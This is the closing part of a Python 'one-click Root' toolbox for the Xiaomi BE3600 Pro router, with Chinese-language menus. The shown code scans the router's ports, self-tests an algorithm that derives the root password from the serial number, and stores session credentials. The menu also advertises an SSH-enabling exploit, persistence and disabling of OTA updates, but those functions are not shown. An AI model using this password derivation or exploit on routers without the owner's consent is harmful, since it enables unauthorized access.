        out, err = p.communicate()
        if p.returncode == 0:
            print(c(Color.GREEN, "  [✓] ICMP Ping 连通正常"))
        else:
            print(c(Color.RED, "  [✗] Ping 失败，请检查网线连接或电脑 IP 是否处于 192.168.31.x 网段"))
    except Exception as e:
        print("  [!] Ping 探测异常: {0}".format(e))

    # 端口探测
    print("\n[*] 正在扫描路由器关键服务端口...")
    ports = [
        (80, "HTTP Web 管理界面"),
        (443, "HTTPS Web 管理界面"),
        (22, "SSH (Dropbear)"),
        (23, "Telnet"),
    ]
    for p_num, desc in ports:
        ok = test_port(ctx.router_ip, p_num, timeout=1.2)
        if ok:
            print("  [{0}] 端口 {1:<4} : {2}".format(c(Color.GREEN, '开放'), p_num, desc))
        else:
            print("  [{0}] 端口 {1:<4} : {2}".format(c(Color.DIM, '关闭'), p_num, desc))

    pause()


# ==============================================================================
# 功能 T: 密码计算算法自测
# ==============================================================================
def menu_selftest():
    print(c(Color.BOLD, "\n--- [T] 密码算法自测 (比对 14 组 qemu 真实固件数据) ---"))
    try:
        ret = run_selftest()
        if ret == 0:
            print(c(Color.GREEN + Color.BOLD, "\n[✓] 自测全部通过！算法与真机/固件 mkxqimage -I 100% 保持一致。"))
        else:
            print(c(Color.RED, "\n[-] 自测有失败项！"))
    except Exception as e:
        print(c(Color.RED, "[-] 自测异常: {0}".format(e)))
    pause()


# ==============================================================================
# 功能 C: 修改配置
# ==============================================================================
def menu_change_config():
    print(c(Color.BOLD, "\n--- [C] 修改配置 (当前会话凭据与设置) ---"))
    ip_status = "{0}".format(ctx.router_ip) if ctx.ip_configured else "{0} (默认/未确认)".format(ctx.router_ip)
    print("1. 路由器 IP      : 当前 {0}".format(c(Color.CYAN, ip_status)))
    if ctx.web_password is None:
        pwd_disp = "未设置"
    elif ctx.web_password == "":
        pwd_disp = "空密码"
    else:
        pwd_disp = "已记住 ({0})".format('*' * len(ctx.web_password))
    print("2. WEB 管理密码   : 当前 {0}".format(pwd_disp))
    print("3. 设备 SN        : 当前 {0}".format(ctx.sn or '未获取 (连接路由器后自动读取)'))
    if ctx.root_pwd:
        print("   Root 密码      : {0}".format(c(Color.GREEN + Color.BOLD, ctx.root_pwd)))
    print("4. 重新设置全部凭据 (IP + WEB密码)")
    print("5. 清空当前记住的凭据")
    print("0. 返回")

    opt = input("\n请选择修改项 (0-5): ").strip()
    if opt == "1":
        nip = input("输入新路由器 IP [回车保持 {0}]: ".format(ctx.router_ip)).strip()
        if nip:
            ctx.router_ip = nip
            ctx.ip_configured = True
            print(c(Color.GREEN, "[+] 路由器 IP 已更新为: {0}".format(ctx.router_ip)))
    elif opt == "2":
        npwd = input("输入 WEB 管理密码 (可直接回车留空): ").strip()
        ctx.web_password = npwd
        print(c(Color.GREEN, "[+] WEB 管理密码已更新"))
    elif opt == "3":
        nsn = input("输入设备 SN: ").strip()
        if nsn:
            ctx.sn = nsn
            ctx.root_pwd = root_pwd(nsn)
            print(c(Color.GREEN, "[+] SN 已更新，Root 密码自动重算为: {0}".format(ctx.root_pwd)))
    elif opt == "4":
        get_credentials(force=True)
        print(c(Color.GREEN, "[+] 配置已全部重设完成"))
    elif opt == "5":
        ctx.ip_configured = False
        ctx.web_password = None
        ctx.sn = ""
        ctx.root_pwd = ""
        ctx.device_info = ""
        print(c(Color.GREEN, "[+] 当前会话凭据已清空"))
    pause()


# ==============================================================================
# 主循环与菜单
# ==============================================================================
def show_banner():
    banner = """
{cyan}=============================================================================
      Xiaomi BE3600 Pro (RP01 / RP02) 一键 Root & 运维管理工具箱
{dim}          No UART · No Disassembly · No Downgrade · Cross-Platform{cyan}
============================================================================={reset}
{summary}
-----------------------------------------------------------------------------
  {c1} 算号器: 计算设备 Root 密码 (基于 SN)
  {c2} 漏洞利用: 一键开启 SSH 服务 (Dropbear 22 端口) {c2_rec}
  {c3} 安全探测: 漏洞只读验证 (--probe，仅发送 ICMP Ping)
  {c4} SSH 终端: 快速连接路由器 (自动配置兼容算法)
  {c5} 持久化: 固化 SSH 访问 & 关闭凌晨静默 OTA 升级 {c5_rec}
  {c6} Flash 备份: 启动备份服务器并生成路由器备份命令 {c6_rec}
  {c7} 高级功能: 执行自定义 Shell 命令 / 临时开启 Telnet
  {c8} 本地配置: 一键写入 ~/.ssh/config 快捷连接别名
  {c9} 环境诊断: 局域网连通性 & 路由器端口扫描
  {cT} 密码算法自测 (比对 14 组 qemu 真实固件数据)
  {cC} 修改配置 (路由器 IP / 密码 / SN)
  {c0} 退出工具箱
-----------------------------------------------------------------------------""".format(
        cyan=Color.CYAN,
        dim=Color.DIM,
        reset=Color.RESET,
        summary=ctx.summary(),
        c1=c(Color.BOLD, '[ 1 ]'),
        c2=c(Color.BOLD, '[ 2 ]'),
        c2_rec=c(Color.GREEN, '[推荐]'),
        c3=c(Color.BOLD, '[ 3 ]'),
        c4=c(Color.BOLD, '[ 4 ]'),
        c5=c(Color.BOLD, '[ 5 ]'),
        c5_rec=c(Color.YELLOW, '[重要]'),
        c6=c(Color.BOLD, '[ 6 ]'),
        c6_rec=c(Color.YELLOW, '[强烈建议]'),
        c7=c(Color.BOLD, '[ 7 ]'),
        c8=c(Color.BOLD, '[ 8 ]'),
        c9=c(Color.BOLD, '[ 9 ]'),
        cT=c(Color.BOLD, '[ T ]'),
        cC=c(Color.BOLD, '[ C ]'),
        c0=c(Color.BOLD, '[ 0 ]')
    )
    print(banner)


def main():
    set_terminal_title("小米 BE3600 Pro Root 工具箱")

    while True:
        try:
            clear_screen()
            show_banner()
            choice = input("请输入选项代号 [0-9, T, C]: ").strip().upper()

            if choice == "1":
                menu_calc_pwd()
            elif choice == "2":
                menu_exploit_ssh()
            elif choice == "3":
                menu_probe()
            elif choice == "4":
                menu_connect_ssh()
            elif choice == "5":
                menu_persistence()
            elif choice == "6":
                menu_backup()
            elif choice == "7":
                menu_advanced()
            elif choice == "8":
                menu_ssh_config()
            elif choice == "9":
                menu_diag()
            elif choice == "T":
                menu_selftest()
            elif choice == "C":
                menu_change_config()
            elif choice in ("0", "Q", "EXIT"):
                print("\n感谢使用，再见！")
                break
            else:
                print(c(Color.YELLOW, "\n无效的选项 '{0}'，请重新输入。".format(choice)))
                time.sleep(1)
        except (KeyboardInterrupt, EOFError):
            print("\n\n已中断退出，再见！")
            break
        except Exception as e:
            print(c(Color.RED, "\n程序遇到未处理异常: {0}".format(e)))
            pause()

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except SystemExit:
        raise
    except Exception as e:
        print("\n[!] 致命错误: {0}".format(e))
        import traceback
        traceback.print_exc()
        try:
            input("\n按回车键退出...")
        except Exception:
            pass
        sys.exit(1)
